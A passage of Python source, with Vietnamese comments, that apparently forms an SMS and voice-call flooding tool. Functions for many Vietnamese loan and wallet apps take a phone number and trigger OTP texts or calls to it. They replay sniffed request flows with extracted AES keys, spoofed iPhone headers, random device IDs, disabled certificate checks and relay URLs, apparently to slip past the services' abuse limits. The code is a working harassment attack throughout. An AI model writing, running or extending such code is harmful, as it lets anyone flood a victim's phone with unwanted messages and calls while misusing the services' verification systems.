    body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
    try:
        async with httpx.AsyncClient(timeout=15, verify=False) as client:
            r = await client.post(
                f"https://{host}{gw_path}", headers=headers, content=body.encode()
            )
        if r.status_code == 200:
            try:
                d = _vvay_decrypt(r.text.strip())
            except Exception:
                print(f"[{label}] ERR không decrypt được response: {r.text[:200]!r}")
                return False
            ok = isinstance(d, dict) and (d.get("successful") is True or d.get("code") == 200)
            if not ok:
                print(f"[{label}] server từ chối: {d.get('msg') if isinstance(d, dict) else d}")
            return ok
        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


# ── SenVay ──
async def Call_SenVay(phone):
    return await _lt_generic(phone, False, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")


async def Call_SenVay_Voice(phone):
    return await _lt_generic(phone, True, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")


# ── LuckyTien ──
async def Call_LuckyTien(phone):
    return await _lt_generic(phone, False, "h5.luckytien.com", "58", "luckytien", "1.0.0_1.0.2")


async def Call_LuckyTien_Voice(phone):
    return await _lt_generic(phone, True, "h5.luckytien.com", "58", "luckytien", "1.0.0_1.0.2")


# ── EasyOkVN (giống _lt_generic của SenVay/HappyGoo + thêm bước operationRecord/save
#    kiểu V88Dong, vì sniff cho thấy 2 domain riêng: api.easyokvn.com (gọi thẳng,
#    UA "24Bot/1 CFNetwork...") và h5.easyokvn.com (gateway path ngẫu nhiên 32 ký tự,
#    UA Mozilla + hậu tố "easyok", giống hệt _lt_rand_path()/_lt_generic) ──
async def _easyok_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
    session_id = "".join(random.choices(string.ascii_lowercase, k=32))
    headers = {
        "appId": "38",
        "Accept": "*/*",
        "version": "1.0.4",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "platform": "2",
        "token": "",
        "deviceId": device_id,
        "User-Agent": "24Bot/1 CFNetwork/1568.200.51 Darwin/24.1.0",
        "Content-Type": "application/json",
    }
    body = {
        "operationCode": "app_start_new",
        "sessionId": session_id,
        "operationTime": str(int(time.time() * 1000)),
    }
    try:
        await client.post(
            "https://api.easyokvn.com/member/operationRecord/save", headers=headers, json=body
        )
    except Exception:
        pass


async def _easyok_generic(phone: str, is_voice: bool) -> bool:
    mobile = phone if phone.startswith("0") else ("0" + phone[2:] if phone.startswith("84") else phone)
    device_id = uuid.uuid4().hex
    host = "h5.easyokvn.com"
    app_id = "38"
    ua_token = "easyok"
    version = "1.0.4_1.1.4"
    path = "/login/requestVerifyCode"
    gw_path = _lt_rand_path()
    label = f"EasyOkVN {'Voice' if is_voice else 'SMS'}"
    headers = {
        "appId": app_id,
        "language": "vi-VN",
        "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) {ua_token}",
        "Referer": f"https://{host}/login",
        "fpPlatform": "2",
        "Origin": f"https://{host}",
        "real_path": path,
        "fpDeviceId": "",
        "version": version,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "x_x_path": _vvay_encrypt_path(path),
        "loginPlatform": "APP",
        "marketToken": "",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
    body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
    try:
        async with _make_client(timeout=20) as client:
            await _easyok_operation_record_save(client, device_id)
            r = await client.post(f"https://{host}{gw_path}", headers=headers, content=body.encode())
        if r.status_code == 200:
            try:
                d = _vvay_decrypt(r.text.strip())
            except Exception:
                print(f"[{label}] ERR không decrypt được response: {r.text[:200]!r}")
                return False
            ok = isinstance(d, dict) and (d.get("successful") is True or d.get("code") == 200)
            if not ok:
                print(f"[{label}] server từ chối: {d.get('msg') if isinstance(d, dict) else d}")
            return ok
        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


async def Call_EasyOkVN(phone):
    return await _easyok_generic(phone, is_voice=False)


async def Call_EasyOkVN_Voice(phone):
    return await _easyok_generic(phone, is_voice=True)


# ── HappyGoo ──
async def Call_HappyGoo(phone):
    return await _lt_generic(phone, False, "h5.6happygoovn.com", "28", "happygoo", "1.0.6_1.8.6")


async def Call_HappyGoo_Voice(phone):
    return await _lt_generic(phone, True, "h5.6happygoovn.com", "28", "happygoo", "1.0.6_1.8.6")


# ── V88Dong ──
_V88_BASE    = "https://api.v88dong.com"
_V88_APP_ID  = "59"
_V88_VERSION = "1.0.0_0.0.0"
_V88_UA      = "V88Dong/200 CFNetwork/1568.200.51 Darwin/24.1.0"


def _v88_base_headers(device_id: str, x_x_path: str = "") -> dict:
    headers = {
        "appId": _V88_APP_ID,
        "language": "vi-VN",
        "User-Agent": _V88_UA,
        "country": "vn",
        "fpPlatform": "5",
        "fpDeviceId": device_id,
        "version": _V88_VERSION,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "loginPlatform": "APP",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "marketToken": "",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Encoding": "identity",
        "Connection": "keep-alive",
    }
    if x_x_path:
        headers["x_x_path"] = x_x_path
        headers["Accept"] = "application/json"
    return headers


async def _v88_check_side_b_plain(client: httpx.AsyncClient, device_id: str) -> None:
    headers = {
        "appId": _V88_APP_ID, "Accept": "*/*", "version": _V88_VERSION,
        "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "identity",
        "platform": "2", "token": "", "deviceId": device_id,
        "User-Agent": _V88_UA, "Content-Type": "application/json",
    }
    try:
        await client.post(f"{_V88_BASE}/login/check-side-b", headers=headers, content=b"")
    except Exception:
        pass


async def _v88_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
    session_id = "".join(random.choices(string.ascii_lowercase, k=32))
    headers = _v88_base_headers(device_id)
    body = {
        "operationCode": "app_start_new",
        "sessionId": session_id,
        "operationTime": str(int(time.time() * 1000)),
    }
    try:
        await client.post(f"{_V88_BASE}/member/operationRecord/save", headers=headers, json=body)
    except Exception:
        pass


async def _v88_check_side_b_h5(client: httpx.AsyncClient, device_id: str, phone: str) -> None:
    gw_path = f"/h5/{device_id}"
    headers = _v88_base_headers(device_id, _vvay_encrypt_path("/login/check-side-b"))
    body = _vvay_encrypt({"phone": phone, "deviceId": device_id})
    try:
        await client.post(f"{_V88_BASE}{gw_path}", headers=headers, content=body.encode())
    except Exception:
        pass


async def _v88_check_phone_no(client: httpx.AsyncClient, device_id: str, phone: str) -> None:
    path = "/login/checkPhoneNo"
    headers = _v88_base_headers(device_id, _vvay_encrypt_path(path))
    try:
        await client.get(f"{_V88_BASE}{path}", params={"phone": phone}, headers=headers)
    except Exception:
        pass


async def _v88_request_verify_code(
    client: httpx.AsyncClient, device_id: str, phone: str, is_voice: bool
) -> bool:
    path = "/login/requestVerifyCode"
    gw_path = f"/h5/{device_id}"
    x_x_path = _vvay_encrypt_path(path)
    body = _vvay_encrypt({"phone": phone, "isVoice": is_voice, "h5": False})
    headers = _v88_base_headers(device_id, x_x_path)
    label = "V88Dong Voice" if is_voice else "V88Dong SMS"
    try:
        r = await client.post(f"{_V88_BASE}{gw_path}", headers=headers, content=body.encode())
        if r.status_code == 200:
            raw = r.text.strip()
            try:
                d = _vvay_decrypt(raw)
            except Exception:
                print(f"[{label}] ERR phan hoi khong phai base64 hop le: {raw[:200]!r}")
                return False
            code = d.get("code") if isinstance(d, dict) else None
            if code != 200 and isinstance(d, dict):
                print(f"[{label}] server tu choi: {d.get('msg')}")
            return code == 200
        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


async def _v88_send(phone: str, is_voice: bool) -> bool:
    device_id = uuid.uuid4().hex
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    async with _make_client(timeout=20) as client:
        await _v88_check_side_b_plain(client, device_id)
        await _v88_operation_record_save(client, device_id)
        await _v88_check_side_b_h5(client, device_id, mobile)
        await _v88_check_phone_no(client, device_id, mobile)
        return await _v88_request_verify_code(client, device_id, mobile, is_voice)


async def Call_V88Dong(phone):
    return await _v88_send(phone, is_voice=False)


async def Call_V88DongVoice(phone):
    return await _v88_send(phone, is_voice=True)


# ── ITake ──
_ITAKE_BASE = "https://h5.6itake-moment.com"


async def Call_ITake(phone):
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    device_id = uuid.uuid4().hex
    check_id  = uuid.uuid4().hex
    base_h = {
        "fpPlatform": "5", "appId": "20", "language": "vi-VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": f"{_ITAKE_BASE}/login", "country": "undefined",
        "fpDeviceId": device_id, "deviceId": device_id, "version": "1.0.0_4.0.4",
        "fingerPrint": "", "platform": "2", "token": "undefined",
        "loginPlatform": "H5", "marketToken": "undefined",
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
    }
    get_h  = {**base_h, "Accept": "*/*", "x_x_path": _vvay_encrypt_path("/login")}
    post_h = {
        **base_h, "Accept": "application/json", "Content-Type": "application/json",
        "Origin": _ITAKE_BASE, "x_x_path": _vvay_encrypt_path("/login/requestVerifyCode"),
    }
    body = _vvay_encrypt({"phone": mobile, "isVoice": True, "h5": False, "deviceId": device_id})
    try:
        async with _make_client(timeout=20) as client:
            await client.get(
                f"{_ITAKE_BASE}/h5/{check_id}", headers=get_h, params={"phone": mobile}
            )
            r = await client.post(
                f"{_ITAKE_BASE}/h5/{device_id}", headers=post_h, content=body.encode()
            )
        try:
            resp = _vvay_decrypt(r.text)
            ok = resp.get("successful") is True or resp.get("code") == 200
            if ok:
                print(f"[ITake] ✅ OK")
            else:
                print(f"[ITake] ❌ {resp.get('msg') or r.text[:100]}")
        except Exception:
            ok = r.status_code == 200
            print(f"[ITake] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
        return ok
    except Exception as e:
        print(f"[ITake] ERR {type(e).__name__}: {e}")
        return False



_VNCREDIT_KEY = b"tdbdif7653scbvy4"
_VNCREDIT_DEVICE_IDS: dict = {}


def _vncredit_encrypt(data: dict) -> dict:
    raw = json.dumps(data, separators=(",", ":")).encode()
    enc = base64.b64encode(AES.new(_VNCREDIT_KEY, AES.MODE_ECB).encrypt(pad(raw, 16))).decode()
    return {"JXTbpertIbc": enc}


def _vncredit_decrypt(resp_json: dict) -> dict:
    try:
        enc = resp_json.get("JXTbpertIbc", "")
        raw = base64.b64decode(enc)
        return json.loads(unpad(AES.new(_VNCREDIT_KEY, AES.MODE_ECB).decrypt(raw), 16).decode())
    except Exception:
        return resp_json


def _vncredit_device_id(phone: str) -> str:
    if phone not in _VNCREDIT_DEVICE_IDS:
        _VNCREDIT_DEVICE_IDS[phone] = str(random.randint(10000000, 99999999))
    return _VNCREDIT_DEVICE_IDS[phone]


def _vncredit_headers(phone: str) -> dict:
    return {
        "Content-Type": "application/json",
        "arHZCqdXMe": "",
        "DJDVItHEOpT": "",
        "TcJSztVvHI": "in",
        "vMdkYlySgyVn": "cn.ivay.h5.viet",
        "BCCpGTCULBU": _vncredit_device_id(phone),
        "xAfAyxfEVv": "",
        "oqBfkSWOjSw": "1",
        "fbcId": "",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ),
    }


async def Call_VnCreSms(phone):
    try:
        ts = str(int(time.time() * 1000))
        headers = {**_vncredit_headers(phone), "arHZCqdXMe": ts, "xAfAyxfEVv": phone}
        async with httpx.AsyncClient(timeout=20, verify=False) as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                json=_vncredit_encrypt({"mobile": phone, "type": "1"}),
                headers=headers,
            )
        d = _vncredit_decrypt(r.json())
        ok = d.get("code") == 0
        if ok:
            print(f"[VNCredit-SMS] ✅ OK")
        else:
            print(f"[VNCredit-SMS] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
        return ok
    except Exception as e:
        print(f"[VNCredit-SMS] ERR {type(e).__name__}: {e}")
        return False


async def Call_VNCreCall(phone):
    try:
        ts = str(int(time.time() * 1000))
        headers = {**_vncredit_headers(phone), "arHZCqdXMe": ts, "xAfAyxfEVv": phone}
        async with httpx.AsyncClient(timeout=20, verify=False) as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                json=_vncredit_encrypt({"mobile": phone, "type": "2"}),
                headers=headers,
            )
        d = _vncredit_decrypt(r.json())
        ok = d.get("code") == 0
        if ok:
            print(f"[VNCredit-Voice] ✅ OK")
        else:
            print(f"[VNCredit-Voice] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
        return ok
    except Exception as e:
        print(f"[VNCredit-Voice] ERR {type(e).__name__}: {e}")
        return False



# ── Vay24h ──
_VAY24H_AES_KEY  = b"5vB8^yC1&zF3*hJ9"
_VAY24H_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
_VAY24H_AES_PKG  = "com.loan.uvwalleth5ios"
_VAY24H_AES_BASE = "https://h5.vay24h.vip"
_VAY24H_AES_HDRS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Content-Language": "vn",
    "system": "ios", "deviceType": "h5", "w": "1170", "h": "2532",
    "appcodename": "Mozilla", "appname": "Netscape",
    "appversion": "5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "platform": "iPhone", "vendor": "Apple Computer, Inc.",
    "screenresolution": "1170,2532",
    "Origin": "https://h5.vay24h.vip",
    "Referer": "https://h5.vay24h.vip/login",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Accept-Encoding": "identity",
    "Connection": "keep-alive",
}


def _vay24h_aes_enc(data: dict) -> str:
    ct = AES.new(_VAY24H_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()

def _vay24h_common(imei: str) -> dict:
    now = time.time()
    return {
        "timestamp": int(now),
        "nonce": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": _VAY24H_AES_SIGN,
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": imei,
        "uuid": imei,
        "pkg_name": _VAY24H_AES_PKG,
        "download_time": f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now))}.000",
    }


async def Call_Vay24h(phone):
    imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    ts = int(time.time() * 1000)
    sign = hashlib.md5(str(ts).encode()).hexdigest()
    try:
        async with httpx.AsyncClient(timeout=30, verify=False) as client:
            body = {
                "phone": phone, "type": 2, "timestamp": ts,
                "referrer": "utm_source=null", "af_prt": None, "sign": sign,
                "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
                "version": "1.0.0", "imei": imei, "uuid": imei,
                "pkg_name": _VAY24H_AES_PKG,
            }
            r = await client.post(
                f"{_VAY24H_AES_BASE}/api/register/app/sendSms",
                headers=_VAY24H_AES_HDRS,
                json=body,
            )
            try:
                d = r.json()
                ok = str(d.get("code", "")) in ("200", "0") or d.get("code") in (200, 0)
                if ok:
                    print(f"[Vay24h] ✅ OK")
                else:
                    print(f"[Vay24h] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
            except Exception:
                ok = r.status_code == 200
                print(f"[Vay24h] {'✅ OK' if ok else f'❌ HTTP {r.status_code}'}")
            return ok
    except Exception as e:
        print(f"[Vay24h] ERR {type(e).__name__}: {e}")
        return False


# ── VayDep365 ──
_VAYDEP_AES_KEY  = b"8fA2#kD9!xL7@mN3"
_VAYDEP_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
_VAYDEP_AES_PKG  = "com.vch.vaychungh5ios"
_VAYDEP_AES_BASE = "https://h5.vaydep365.com"
_VAY_DEP365_URLS = [
    "https://ndnndfndndbb--28fa0824520211f1bae0ee650bb23af1.web.val.run",
    "https://wander6fb5.xadoa8.workers.dev/vaydep365",
    "https://verceldeploy-one-phi.vercel.app/api/vaydep",
]
_VAYDEP_AES_HDRS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Content-Language": "vn",
    "system": "ios", "deviceType": "h5", "w": "1170", "h": "2532",
    "appcodename": "Mozilla", "appname": "Netscape",
    "appversion": "5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "platform": "iPhone", "vendor": "Apple Computer, Inc.",
    "screenresolution": "1170,2532",
    "Origin": "https://h5.vaydep365.com",
    "Referer": "https://h5.vaydep365.com/login",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Accept-Encoding": "identity",
    "Connection": "keep-alive",
}


def _vaydep_aes_enc(data: dict) -> str:
    ct = AES.new(_VAYDEP_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()


def _vaydep_aes_common(imei: str) -> dict:
    now = time.time()
    return {
        "timestamp": int(now),
        "nonce": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": _VAYDEP_AES_SIGN,
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": imei,
        "uuid": imei,
        "pkg_name": _VAYDEP_AES_PKG,
        "download_time": f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now))}.000",
    }


async def Call_VayDep365(phone):
    imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, verify=False) as client:
            r1 = await client.post(
                f"{_VAYDEP_AES_BASE}/api/comm/downoknotify",
                headers=_VAYDEP_AES_HDRS,
                json={**_vaydep_aes_common(imei), "type": 1},
            )
            d1 = {}
            try:
                d1 = r1.json()
            except Exception:
                pass
            if d1.get("code") not in ("200", 200):
                return False
            enc_data = _vaydep_aes_enc({
                "phone": phone, "type": "1",
                "pkg_name": _VAYDEP_AES_PKG, "voice": "0", "reApply": "",
            })
            r2 = await client.post(
                f"{_VAYDEP_AES_BASE}/api/register/h5/sendSms",
                headers=_VAYDEP_AES_HDRS,
                json={"encryptedData": enc_data, "pkg_name": _VAYDEP_AES_PKG},
            )
            return r2.status_code == 200
    except Exception as e:
        print(f"[VayDep365] ERR {type(e).__name__}: {e}")
        return False


# ── UVWallet / SaoThinhVuong (cùng pattern Vay24h-ECB) ──
async def Call_UVWallet(phone):
    try:
        headers = {
            "User-Agent": random.choice(_XMH_UA_POOL),
            "deviceType": "h5", "channel": "",
            "appversion": random.choice(_XMH_UA_POOL),
            "vendor": "Apple Computer, Inc.",
            "Origin": "https://h5.uvwalletvn.com",
            "Referer": "https://h5.uvwalletvn.com/login",
            "Sec-Fetch-Dest": "empty", "h": "2532", "system": "ios",
            "Sec-Fetch-Site": "same-origin", "w": "1170",
            "appname": "Netscape", "platform": "iPhone",
            "appcodename": "Mozilla", "screenresolution": "1170,2532",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Content-Language": "vn", "Sec-Fetch-Mode": "cors",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        ts   = int(time.time() * 1000)
        imei = hashlib.md5(str(random.random()).encode()).hexdigest()
        sign = hashlib.md5(str(ts).encode()).hexdigest()
        body = {
            "phone": phone, "type": 2, "timestamp": ts,
            "referrer": "utm_source=null", "af_prt": None, "sign": sign,
            "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
            "version": "1.0.0", "imei": imei, "uuid": imei,
            "pkg_name": "com.loan.uvwalleth5ios",
        }
        async with _make_client() as client:
            r = await client.post(
                "https://h5.uvwalletvn.com/api/register/app/sendSms",
                headers=headers, json=body,
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[UVWallet] ERR {type(e).__name__}: {e}")
        return False


async def Call_SaoThinhVuong(phone):
    try:
        headers = {
            "User-Agent": random.choice(_XMH_UA_POOL),
            "deviceType": "h5", "channel": "",
            "appversion": random.choice(_XMH_UA_POOL),
            "vendor": "Apple Computer, Inc.",
            "Origin": "https://h5.saothinhvuong.cc",
            "Referer": "https://h5.saothinhvuong.cc/login",
            "Sec-Fetch-Dest": "empty", "h": "2532", "system": "ios",
            "Sec-Fetch-Site": "same-origin", "w": "1170",
            "appname": "Netscape", "platform": "iPhone",
            "appcodename": "Mozilla", "screenresolution": "1170,2532",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Content-Language": "vn", "Sec-Fetch-Mode": "cors",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        ts16   = int(time.time() * 1000)
        imei16 = hashlib.md5(str(random.random()).encode()).hexdigest()
        sign16 = hashlib.md5(str(ts16).encode()).hexdigest()
        body = {
            "phone": phone, "type": 2, "timestamp": ts16,
            "referrer": "utm_source=null", "af_prt": None, "sign": sign16,
            "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
            "version": "1.0.0", "imei": imei16, "uuid": imei16,
            "pkg_name": "com.loan.starwarsh5ios",
        }
        async with _make_client() as client:
            r = await client.post(
                "https://h5.saothinhvuong.cc/api/register/app/sendSms",
                headers=headers, json=body,
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[SaoThinhVuong] ERR {type(e).__name__}: {e}")
        return False


_MUAVAY_AES_KEY = b"IYFlUR+o0ec3uRlg2fhUzQ=="  # 24 bytes → AES-192


def _muavay_enc(data: dict) -> str:
    ct = AES.new(_MUAVAY_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()


def _muavay_dec(b64_cipher: str) -> dict:
    try:
        raw = base64.b64decode(b64_cipher)
        pt = unpad(AES.new(_MUAVAY_AES_KEY, AES.MODE_ECB).decrypt(raw), 16)
        return json.loads(pt.decode())
    except Exception:
        return {}


async def Call_MuaVayLoan(phone):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": "https://www.muavayloan.top",
            "Referer": "https://www.muavayloan.top/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Mua_Vay"})}
        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
            r = await client.post(
                "https://www.muavayloan.top/app-gateway/api/operator/opt/send",
                headers=headers, json=body,
            )
        d = {}
        try:
            outer = r.json()
            d = _muavay_dec(outer["key"]) if "key" in outer else outer
            code = d.get("code")
            ok = d.get("ok") is True or code == 1 or str(code) in ("200", "0")
        except Exception:
            ok = r.status_code == 200
        if ok:
            print(f"[MuaVayLoan] ✅ OK")
        else:
            msg = d.get("message") or d.get("msg") or r.text[:100]
            print(f"[MuaVayLoan] ❌ {msg}")
        return bool(ok)
    except Exception as e:
        print(f"[MuaVayLoan] ERR {type(e).__name__}: {e}")
        return False


async def Call_MoneyCashLoan(phone):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": "http://www.moneycashloan.top",
            "Referer": "http://www.moneycashloan.top/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Money_Cash"})}
        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
            r = await client.post(
                "http://www.moneycashloan.top/app-gateway/api/operator/opt/send",
                headers=headers, json=body,
            )
        d = {}
        try:
            d = _muavay_dec(r.json().get("key", ""))
            ok = d.get("ok") is True or d.get("code") in (1, 200, "200", "0")
        except Exception:
            ok = r.status_code == 200
        if ok:
            print(f"[MoneyCashLoan] ✅ OK")
        else:
            msg = d.get("message") or d.get("msg") or r.text[:100]
            print(f"[MoneyCashLoan] ❌ {msg}")
        return bool(ok)
    except Exception as e:
        print(f"[MoneyCashLoan] ERR {type(e).__name__}: {e}")
        return False


async def Call_NganNgan(phone):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": "http://www.nganngan.top",
            "Referer": "http://www.nganngan.top/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "identity", "Connection": "keep-alive",
        }
        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Ngan_Vay"})}
        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
            r = await client.post(
                "http://www.nganngan.top/app-gateway/api/operator/opt/send",
                headers=headers, json=body,
            )
        d = {}
        try:
            d = _muavay_dec(r.json().get("key", ""))
            ok = d.get("ok") is True or d.get("code") in (1, 200, "200", "0")
        except Exception:
            ok = r.status_code == 200
        if ok:
            print(f"[NganNgan] ✅ OK")
        else:
            msg = d.get("message") or d.get("msg") or r.text[:100]
            print(f"[NganNgan] ❌ {msg}")
        return bool(ok)
    except Exception as e:
        print(f"[NganNgan] ERR {type(e).__name__}: {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# NHÓM 6 — FINVUITECH AES-ECB
# ══════════════════════════════════════════════════════════════════════════════

_FinVui_KEY = b"r3gk088TfheCv47F"


def _finvui_enc(obj, key: bytes) -> str:
    if isinstance(obj, (dict, list)):
        obj = json.dumps(obj, separators=(",", ":"), ensure_ascii=False)
    ct = AES.new(key, AES.MODE_ECB).encrypt(pad(obj.encode(), 16))
    return base64.b64encode(ct).decode()


def _finvui_dec(ct_b64: str, key: bytes):
    raw = AES.new(key, AES.MODE_ECB).decrypt(base64.b64decode(ct_b64))
    text = unpad(raw, 16).decode()
    try:
        return json.loads(text)
    except Exception:
        return text


async def Call_FinVuiTeck(phone):
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    body_plain = {"businessType": "login", "channelType": "1", "mobile": mobile}
    short_path = "/api/code/sendCode"
    try:
        async with _make_client(timeout=20) as client:
            r = await client.post(
                "https://api.finvuitech.com/fapi/u21w1id1sjw27hq7e2780rm9c8mjqh2d",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Origin": "http://h5.finvuitech.com",
                    "Referer": "http://h5.finvuitech.com/",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
                    "Accept-Language": "vi-VN,vi;q=0.9",
                    "gutjqidj": _finvui_enc(short_path, _FinVui_KEY),
                    "yxshibrd": "2", "h5-version": "1.2.1",
                    "nshjghxq": "105", "cojjaqbq": "14",
                    "ncycfrss": "h5123456789", "isvpfpui": "FV",
                    "fzwdwroz": "", "version": "1.0.0",
                    "deviceId": "", "x-language": "vn", "appLanguage": "vn",
                },
                content=_finvui_enc(body_plain, _FinVui_KEY),
            )
        try:
            resp = _finvui_dec(r.text, _FinVui_KEY)
            if isinstance(resp, dict):
                ok = str(resp.get("code", "")) in ("0", "200") or resp.get("success") is True
                if ok:
                    print(f"[FinVuiTeck] ✅ OK")
                else:
                    print(f"[FinVuiTeck] ❌ {resp.get('message') or resp.get('msg') or r.text[:100]}")
            else:
                ok = r.status_code == 200
                print(f"[FinVuiTeck] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
        except Exception:
            ok = r.status_code == 200
